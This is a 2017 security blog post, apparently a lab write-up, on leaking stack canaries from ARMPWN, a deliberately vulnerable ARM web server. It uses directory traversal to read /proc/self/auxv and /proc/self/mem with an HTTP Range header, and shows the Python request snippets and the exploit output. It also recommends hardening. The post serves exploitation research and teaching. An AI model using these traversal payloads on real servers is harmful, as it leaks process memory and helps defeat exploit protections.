<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="ARMPWN redux: canary reloaded" prefix="og: http://ogp.me/ns#" property=og:title><meta content="ARMPWN redux: canary reloaded - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-01-24-armpwn-redux-canary-reloaded property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/canary-header.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="ARMPWN redux: canary reloaded - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-01-24-armpwn-redux-canary-reloaded name=twitter:url><meta content=https://blahcat.github.io/img/canary-header.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-01-24-armpwn-redux-canary-reloaded",
      
      "image": https://blahcat.github.io/img/canary-header.png",
      
      
      "description": ARMPWN redux: canary reloaded - by hugsy",
      
    }
    </script><title>
  ARMPWN redux: canary reloaded
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/canary-header.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>ARMPWN redux: canary reloaded</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 24 January 2017 <br> <br> <i>Reading time: 5 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><blockquote><p><strong>TL;DR</strong>: It is possible to defeat stack canary protection when a binary is vulnerable to arbitrary file read.</blockquote><h1 id=intro>Intro</h1><p>First of, Happy New Year 2017 ✌<p>Recently, I’ve decided to thoroughly investigate the “<em>Stack Smashing Protection</em>” (SSP) on recent Linux and recent Glibc. This research has led to a blog post available on <a rel="noopener nofollow noreferrer" href=https://www.elttam.com.au/blog target=_blank>elttam R&D blog</a>. Among many other things, I’ve found that canaries built with recent glibc may have their values leaked, should the program be also vulnerable to an arbitrary file read access, and if it exposes its <a rel="noopener nofollow noreferrer" href=https://www.elttam.com.au/blog/playing-with-canaries#auxiliary-vector target=_blank>Auxiliary Vector</a> via the <code>procfs</code> structure.<p>All the details regarding the following attack on the canary are explained in this blog post, so I will assume that you are familiar with it. If you’re not:<ul><li>the full article is <a rel="noopener nofollow noreferrer" href=https://www.elttam.com.au/blog/playing-with-canaries target=_blank>here</a><li>the code repository is <a rel="noopener nofollow noreferrer" href=https://github.com/elttam/canary-fun target=_blank>there</a></ul><p>In the article, I imagined the attack scenario would apply perfectly well to a Web or FTP server, and would occur following those steps:<ol><li>dump <code>/proc/self/auxv</code> to get the <code>AT_RANDOM</code> location<li>read <code>/proc/self/mem</code> and force an <code>lseek</code> access to reach the location found above via the <a rel="noopener nofollow noreferrer" href=https://tools.ietf.org/html/rfc7233#page-8 target=_blank>HTTP header Range</a> (for instance <code>Range: bytes=&LT0xAT_RANDOM_LOCATION>-&LT0xAT_RANDOM_LOCATION+16></code>)<li>Truncate the received buffer to <code>sizeof(register)</code><li>Nullify the last byte (<code>result &= ~0xff</code>)</ol><p>That was the theory, which made perfect sense, but I wanted a practice case.<p>Earlier this year, I <a href=/posts/2016/06/13/armpwn-challenge-write-up.html>had some fun with ARMPWN</a>, a vulnerable web server created by <a class="fab fa-twitter" href=https://twitter.com/5aelo target=_blank> <code>@5aelo</code> </a> to practice exploitation on ARM, so I have decided to use it for a practical, yet very realistic exploit case.<p>You can download:<ul><li><a rel="noopener nofollow noreferrer" href=https://gist.github.com/00d74ecac86297efc6772e415f307176 target=_blank>the new websrv.c here</a><li><a rel="noopener nofollow noreferrer" href=https://gist.github.com/c2dbc3e3c11836dcebf53a2189f35976 target=_blank>or simply the patch here</a></ul><h2 id=patch-analysis>Patch analysis</h2><p>This cheap patch provides to the “new” <code>websrv</code> the (pseudo-)capability to <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/00d74ecac86297efc6772e415f307176#file-websrv-c-L181-L201 target=_blank>parse the HTTP Range header</a> provided by the client. This is basically how modern Web servers (Apache, nginx) treat this header.<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>unsigned long</span><span> start, end;
</span><span style=color:#b48ead>char </span><span>*ptr;
</span><span style=color:#b48ead>int</span><span> r;
</span><span>
</span><span>start = end = </span><span style=color:#d08770>0</span><span>;
</span><span>ptr = </span><span style=color:#bf616a>get_range_header</span><span>(request, len);
</span><span style=color:#b48ead>if </span><span>(ptr){
</span><span>    </span><span style=color:#b48ead>if</span><span>(</span><span style=color:#bf616a>get_ranges_from_header</span><span>(ptr, &start, &end)==</span><span style=color:#d08770>0</span><span>){
</span><span>        </span><span style=color:#b48ead>if </span><span>(start && end){
</span><span>            </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>:</span><span style=color:#d08770>%d</span><span style=color:#a3be8c> reading range of file '</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>' from </span><span style=color:#d08770>%u</span><span style=color:#a3be8c>-</span><span style=color:#d08770>%u</span><span style=color:#96b5b4>\n</span><span>", </span><span style=color:#bf616a>inet_ntoa</span><span>(client.</span><span style=color:#bf616a>sin_addr</span><span>), </span><span style=color:#bf616a>htons</span><span>(client.</span><span style=color:#bf616a>sin_port</span><span>), file, start, end);
</span><span>            </span><span style=color:#b48ead>if </span><span>(</span><span style=color:#bf616a>lseek</span><span>(</span><span style=color:#bf616a>fileno</span><span>(f), start, SEEK_SET)==-</span><span style=color:#d08770>1</span><span>){
</span><span>                </span><span style=color:#96b5b4>perror</span><span>("</span><span style=color:#a3be8c>lseek() failed:</span><span>");
</span><span>[...]
</span></code></pre><p>In the earlier exploit, we had exploited the Directory Traversal to dump the process memory mapping (via <code>/proc/self/maps</code>) and defeat PIE & ASLR. To crush SSP protection, we managed to get the canary value by brute-forcing it, which is very noisy (the canary can be found in max. of 4*256=1024 HTTP requests on a 32-bit architecture, 2048 on 64-bit) and risky (the memory corruption may alert of an on-going attack).<p>But now we can actually do much better: we have all the conditions mentioned earlier to exfiltrate the canary’s value, thanks to the ELF Auxiliary Vector.<h2 id=exploitation>Exploitation</h2><p>This approach is a lot more stable and stealthier than canary brute-forcing, since we don’t rely on any memory corruption/process crash to determine the valid bytes of the canary <a href=/2016/06/12/armpwn-challenge#leaking-the-canary>as we did before</a>.<h3 id=find-at-random-from-the-auxiliary-vector>Find AT_RANDOM from the Auxiliary Vector</h3><p>So first, we need to read the process <em>Auxiliary Vector</em> exposed via <code>procfs</code>.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>s.</span><span style=color:#bf616a>send</span><span>("</span><span style=color:#a3be8c>GET ../../../../../proc/self/auxv HTTP/1.0</span><span style=color:#96b5b4>\r\n\r\n</span><span>")
</span></code></pre><p>And then parse the result:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#bf616a>AT_RANDOM </span><span>= </span><span style=color:#d08770>25
</span><span>[</span><span style=color:#d08770>...</span><span>]
</span><span>data = s.</span><span style=color:#bf616a>recv</span><span>(</span><span style=color:#d08770>1024</span><span>)
</span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>0</span><span>, </span><span style=color:#96b5b4>len</span><span>(data), </span><span style=color:#d08770>8</span><span>):
</span><span>    code = struct.</span><span style=color:#bf616a>unpack</span><span>("</span><span style=color:#a3be8c>&LTI</span><span>", data[i:i+</span><span style=color:#d08770>4</span><span>])[</span><span style=color:#d08770>0</span><span>]
</span><span>    </span><span style=color:#b48ead>if </span><span>code==</span><span style=color:#bf616a>AT_RANDOM</span><span>:
</span><span>        at_random_address = struct.</span><span style=color:#bf616a>unpack</span><span>("</span><span style=color:#a3be8c>&LTI</span><span>", data[i+</span><span style=color:#d08770>4</span><span>:i+</span><span style=color:#d08770>8</span><span>])[</span><span style=color:#d08770>0</span><span>]
</span><span>        </span><span style=color:#b48ead>break
</span></code></pre><p>If we did things correctly, this will store in the variable <code>at_random_address</code> the address of the 16 random bytes provided by the kernel, used to create the canary.<h3 id=l-seeking-the-process-memory-via-the-http-range-header>(l)seeking the process memory via the HTTP Range header</h3><p>Since <code>procfs</code> also exposes the process memory, we can use <code>/proc/&LTpid>/mem</code> to seek to the address we’ve found at the step above.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>m = "</span><span style=color:#a3be8c>GET ../../../../../proc/self/mem HTTP/1.0</span><span style=color:#96b5b4>\r\n</span><span>"
</span><span>m+= "</span><span style=color:#a3be8c>Range: bytes=</span><span style=color:#d08770>{:d}</span><span style=color:#a3be8c>-</span><span style=color:#d08770>{:d}</span><span style=color:#96b5b4>\r\n\r\n</span><span>".</span><span style=color:#bf616a>format</span><span>(at_random_address,at_random_address+</span><span style=color:#d08770>16</span><span>)
</span><span>s.</span><span style=color:#bf616a>send</span><span>(m)
</span></code></pre><div class=alert-warning markdown=span><b class=markdown-alert-title> <svg class="octicon octicon-alert mr-2" viewbox="0 0 16 16" aria-hidden=true height=16 version=1.1 width=16><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg> Warning </b><p><p><code>yama/ptrace_scope</code> must be set to 0 to be able to read the process memory.</div><h3 id=fire>Fire!</h3><p>The final exploitation script which combines all the steps described above can be found <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/a462b398721bfb7e6bbd678b6d0e852b target=_blank>here</a>.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> python armpwn_leak_canary.py
</span><span style=color:#bf616a>[+]</span><span> Connected to '</span><span style=color:#a3be8c>rpi2-1:80</span><span>'
</span><span style=color:#bf616a>[+]</span><span> Leaking AUVX
</span><span style=color:#bf616a>[+]</span><span> AT_RANDOM=0xbe8409c5
</span><span style=color:#bf616a>[+]</span><span> Forging HTTP request using Range
</span><span style=color:#bf616a>[+]</span><span> Canary is 0xd998d300
</span></code></pre><p>To be we fetched the correct value for the canary of the remote process, we can use <a rel="noopener nofollow noreferrer" href=https://github.com/elttam/canary-fun/blob/master/read_canary_from_pid.py target=_blank>this script</a> locally to compare the values for the canary:</p><a href=https://i.imgur.com/IWpuMIy.png target=_blank> <img alt=image_alt src=https://i.imgur.com/IWpuMIy.png title=image_alt width=100%> </a><h2 id=conclusion>Conclusion</h2><p>This exploitation shows a different way to leak the canary value, and therefore defeat the SSP protection. As you may have noticed, since this attack does not rely on memory corruption, it is extremely reliable. And it is also much faster: the canary brute-force can take up 4x256 (or resp. 8x256 for 64-bits) requests to determine, where this approach found the same value with only 2 requests.<p>This illustrates once again the need to maintain a system as hardened as possible, especially on production systems, since restricting <code>ptrace</code>, or refusing to expose AUXV like GrSec does, would defeat this attack.<p>Thanks for reading, and as usual drop me a line on IRC/Twitter/email for any question/comment ☕<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/linux/>#linux</a> <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/arm/>#arm</a> <a href=https://blahcat.github.io/tags/ssp/>#ssp</a> <a href=https://blahcat.github.io/tags/armpwn/>#armpwn</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=ARMPWN redux: canary reloaded" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2017-01-26-insomni-hack-ctf-2017-bender-safe/> <section class=post-nav-teaser><b class=post-nav-title>Insomni'Hack CTF 2017: bender_safer</b><p class=post-nav-excerpt>Insomni’Hack CTF 2017 offered a series of 3 challenges (i.e. 3 different fl…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-09-06-twctf-2016-reverse-box-writeup/> <section class=post-nav-teaser><b class=post-nav-title>TWCTF 2016 - reverse_box writeup</b><p class=post-nav-excerpt>The reverse_box challenge of TWCTF 2016 was a warmup challenge (only 50 poi…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>